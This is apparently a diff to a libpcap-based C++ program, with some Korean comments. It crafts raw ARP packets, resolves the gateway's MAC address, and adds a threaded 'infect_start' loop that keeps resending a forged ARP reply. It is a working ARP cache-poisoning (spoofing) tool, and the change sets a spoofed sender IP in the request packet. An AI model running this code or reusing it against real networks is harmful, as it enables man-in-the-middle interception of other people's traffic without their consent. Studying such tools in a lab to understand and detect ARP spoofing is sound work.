@@ -15,6 +15,9 @@
 #include <unistd.h>
 #include "mac.h"
 
+#include <iostream> //add
+#include <thread>   //add
+#include <pthread.h>
 
 
 
@@ -34,6 +37,8 @@ typedef struct makearphdr
 
 
 void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b); //get mac addr from reply
+void infect_start(pcap_t *a,uint8_t b[]);
+
 
 int main(int argc, char *argv[])
 {
@@ -66,10 +71,6 @@ int main(int argc, char *argv[])
 
     Mac des_mac;
     des_mac="ff:ff:ff:ff:ff:ff";
-
-    //Mac sor_mac; //auto check..         <-fix later
-    //sor_mac=argv[4];//                  <-fix later
-
 
     uint16_t etype = htons(0x0806);
 
@@ -107,7 +108,7 @@ int main(int argc, char *argv[])
     memcpy(rq_packet+19,&rq.ar_pln,1);
     memcpy(rq_packet+20,&rq.ar_op,2);
     memcpy(rq_packet+22,&mymac,6);
-    memcpy(rq_packet+28,&mmip,4);
+    memcpy(rq_packet+28,&asip,4);
     memcpy(rq_packet+32,&arptm,6);
     memcpy(rq_packet+38,&atip,4);
 
@@ -121,10 +122,17 @@ int main(int argc, char *argv[])
         printf("%s\n",errbuf);
         return 0;
     }
+    pcap_sendpacket(fp,(u_char*)rq_packet,42);
+
+    /*
     if(pcap_sendpacket(fp,(u_char*)rq_packet,42) != 0)
     {
         fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(fp));
-    }
+    }*/
+
+
+
+
   //  /////////////////////////////////////////////////////////////////////////////////////////////////
     //look reply ip!!!  <--fix
     int res;
@@ -142,6 +150,57 @@ int main(int argc, char *argv[])
             break;  //<-fix
     }
 
+
+    //---------------------------------------------------------------------------------------request gateway
+
+        char *gateip=argv[2];
+        u_int32_t gate_t_ip;
+        inet_pton(AF_INET, gateip, &gate_t_ip);
+
+        uint8_t rqgate_packet[42]; //make complete packet
+
+        memset(rqgate_packet,0,42);
+
+        memcpy(rqgate_packet,&des_mac,6);//ff~ff
+        memcpy(rqgate_packet+6,&mymac,6);//my mac
+        memcpy(rqgate_packet+12,&etype,2);
+        memcpy(rqgate_packet+14,&rq.ar_hrd,2);
+        memcpy(rqgate_packet+16,&rq.ar_pro,2);
+        memcpy(rqgate_packet+18,&rq.ar_hln,1);
+        memcpy(rqgate_packet+19,&rq.ar_pln,1);
+        memcpy(rqgate_packet+20,&rq.ar_op,2);
+        memcpy(rqgate_packet+22,&mymac,6);//my mac
+        memcpy(rqgate_packet+28,&mmip,4);//my ip
+        memcpy(rqgate_packet+32,&arptm,6);//ff~ff
+        memcpy(rqgate_packet+38,&gate_t_ip,4);//gate ip : argv[2]
+
+
+        pcap_t *gp;
+    //---------------------------------------------------------------------------------------send gateway request arp
+        gp=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
+        if(gp==NULL)
+        {
+           printf("%s\n",errbuf);
+           return 0;
+        }
+        pcap_sendpacket(gp,(u_char*)rqgate_packet,42);
+
+    //------------------------------reply gate mac information-------------------------------------------------
+
+
+        int repl;
+        u_int8_t gatemac[6]; //tm, arp_tm -> get reply from mac addr
+        const u_char *gate_data; //
+        struct pcap_pkthdr *gheader; //
+
+        while((repl=pcap_next_ex(gp, &gheader, &gate_data))>=0)
+        {
+            if(repl==1)
+            {
+                make_t_mac(gate_data,gatemac,argv[2]); // get reply data -> target mac //<-ho temp
+            }
+            break;  //<-fix
+        }
 
 
 //-//////////////////////////////////////////////////////infection reply start//////////////////////////////////////////////////////////////
@@ -191,72 +250,11 @@ int main(int argc, char *argv[])
         {
             printf("%s\n",errbuf);
             return 0;
-        }/*
-        while(fpp!=NULL)
-        {*/
-            if(pcap_sendpacket(fpp,(u_char*)packet,42) != 0)
-            {
-                fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(fpp));
-            }/*
-            //sleep(1);
-        }*/
-
-//=========================================================================================
-//request gateway
-
-    char *gateip=argv[2];
-    u_int32_t gate_t_ip;
-    inet_pton(AF_INET, gateip, &gate_t_ip);
-
-    uint8_t rqgate_packet[42]; //make complete packet
-
-    memset(rqgate_packet,0,42);
-
-    memcpy(rqgate_packet,&des_mac,6);//ff~ff
-    memcpy(rqgate_packet+6,&mymac,6);//my mac
-    memcpy(rqgate_packet+12,&etype,2);
-    memcpy(rqgate_packet+14,&rq.ar_hrd,2);
-    memcpy(rqgate_packet+16,&rq.ar_pro,2);
-    memcpy(rqgate_packet+18,&rq.ar_hln,1);
-    memcpy(rqgate_packet+19,&rq.ar_pln,1);
-    memcpy(rqgate_packet+20,&rq.ar_op,2);
-    memcpy(rqgate_packet+22,&mymac,6);//my mac
-    memcpy(rqgate_packet+28,&mmip,4);//my ip
-    memcpy(rqgate_packet+32,&arptm,6);//ff~ff
-    memcpy(rqgate_packet+38,&gate_t_ip,4);//gate ip : argv[2]
-
-
-    pcap_t *gp;
-//---------------------------------------------------------------------------------------send gateway request arp
-    gp=pcap_open_live(dev,BUFSIZ,0,1,errbuf);
-    if(gp==NULL)
-    {
-       printf("%s\n",errbuf);
-       return 0;
-    }
-    if(pcap_sendpacket(gp,(u_char*)rqgate_packet,42) != 0)
-    {
-       fprintf(stderr,"\n Error sending the packet:\n",pcap_geterr(gp));
-    }
-
-
-//------------------------------reply gate mac-------------------------------------------------
-
-
-    int repl;
-    u_int8_t gatemac[6]; //tm, arp_tm -> get reply from mac addr
-    const u_char *gate_data; //
-    struct pcap_pkthdr *gheader; //
-
-    while((repl=pcap_next_ex(gp, &gheader, &gate_data))>=0)
-    {
-        if(repl==1)
-        {
-            make_t_mac(gate_data,gatemac,argv[2]); // get reply data -> target mac //<-ho temp
         }
-        break;  //<-fix
-    }
-}
+        std :: thread infect(&infect_start,fpp,packet);
+        infect.join();
+  }
+//=========================================================================================
 
 
 void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b)//아이피를 비교해서 맞을때만 맥주소를 가져오는 함수
@@ -268,8 +266,18 @@ void make_t_mac(const u_char *pkt_data, u_int8_t a[], char *b)//아이피를 비
 
     u_int32_t packetip=ep->ar_sip;
 
-    if(match_sip==packetip)
+    if(match_sip==packetip)  //argv[2] 게이트웨이 아이피 와 패킷에서의 arp source ip 가 같을때만 맥을 빼온다.
     {
         memcpy(a,((struct ether_header *)pkt_data)->ether_shost,6);
+    }
+}
+void infect_start(pcap_t *a,uint8_t b[])
+{
+
+    while(a!=NULL)
+    {
+        pcap_sendpacket(a,(u_char*)b,42);
+
+        sleep(100);//recover test
     }
 }
